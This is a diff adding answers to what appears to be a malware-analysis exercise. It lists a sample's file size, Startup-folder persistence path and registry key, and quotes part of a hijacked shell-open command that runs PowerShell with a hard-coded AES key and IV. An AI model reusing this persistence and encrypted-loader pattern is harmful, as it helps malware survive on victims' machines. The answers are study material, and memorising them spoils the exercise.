@@ -103,3 +103,22 @@
 // 301.35 MB
 
 // Q6
+// 2.52 MB
+
+// Q7
+// Resource: https://www.virustotal.com/gui/file/2bf0a64fe7aea262c96fc7d52b1e28486ff607caa9513fd88583e19454f9c500/behavior
+// Under Files Written
+// %APPDATA%\microsoft\windows\start menu\programs\startup\
+
+// Q8
+// HKEY_CURRENT_USER
+
+// Q9
+// HKEY_CURRENT_USER\Software\Classes\20d5tb0djr2\shell\open\command\(Default)
+// powershell -command "$A=New-Object System.Security.Cryptography.AesCryptoServiceProvider;$A.Key=@([byte]125,100,81,66,148,128,244,47,37,69,113,105,136,2,97,123,150,240,16,219,189,26,225,83,17,191,185,169,90,13,162,42);$A.IV=@([byte]220,229,82,217,148,241,4 
+
+// Q10
+// AesCryptoServiceProvider
+
+// Q11
+// powershell.exe
